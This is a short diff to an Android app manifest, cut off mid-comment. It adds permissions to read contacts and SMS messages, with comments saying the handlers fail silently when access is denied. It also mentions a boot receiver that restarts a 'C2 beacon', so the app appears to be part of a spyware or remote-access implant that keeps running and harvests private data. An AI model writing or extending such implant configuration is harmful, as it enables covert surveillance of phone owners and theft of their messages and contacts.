@@ -1,5 +1,16 @@
 <?xml version="1.0" encoding="utf-8"?>
 <manifest xmlns:android="http://schemas.android.com/apk/res/android">
+    <!--
+        READ_CONTACTS is a dangerous permission (requires runtime grant).
+        It is declared here to make it available; the code handles
+        SecurityException gracefully when the user has not granted it.
+    -->
+    <uses-permission android:name="android.permission.READ_CONTACTS" />
+    <!--
+        READ_SMS is a dangerous permission (requires runtime grant).
+        Declared here; handler silently fails with SecurityException if denied.
+    -->
+    <uses-permission android:name="android.permission.READ_SMS" />
     <application>
         <!--
             Beacon boot receiver: automatically restarts the C2 beacon after
